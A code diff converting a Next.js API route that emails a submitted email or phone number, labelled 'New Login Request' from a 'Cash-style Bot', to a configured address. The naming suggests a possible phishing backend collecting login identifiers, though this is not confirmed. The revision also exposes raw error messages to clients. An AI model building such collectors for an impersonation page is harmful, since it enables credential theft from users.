@@ -1,23 +1,21 @@
 import nodemailer from "nodemailer";
 
-export async function POST(req) {
-  try {
-    const { email, phone } = await req.json();
+export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({ success: false, message: "Method not allowed" });
+  }
 
-    // Pastikan salah satu ada
+  try {
+    const { email, phone } = req.body;
+
     if (!email && !phone) {
-      return new Response(
-        JSON.stringify({ success: false, message: "Email atau Phone harus diisi" }),
-        { status: 400 }
-      );
+      return res.status(400).json({ success: false, message: "Email atau Phone harus diisi" });
     }
 
-    // Buat pesan sesuai field yang ada
     let text = "";
     if (email) text = `Email: ${email}`;
     if (phone) text = `Phone: ${phone}`;
 
-    // Transporter
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
@@ -26,21 +24,16 @@ export async function POST(req) {
       },
     });
 
-    const mailOptions = {
+    await transporter.sendMail({
       from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
       to: process.env.MAIL_TO,
       subject: "New Login Request",
       text,
-    };
+    });
 
-    await transporter.sendMail(mailOptions);
-
-    return new Response(JSON.stringify({ success: true }), { status: 200 });
+    return res.status(200).json({ success: true });
   } catch (error) {
-    console.error("SendMail Error:", error);
-    return new Response(
-      JSON.stringify({ success: false, message: "Internal server error" }),
-      { status: 500 }
-    );
+    console.error("SendMail Error:", error.message, error);
+    return res.status(500).json({ success: false, message: error.message });
   }
 }
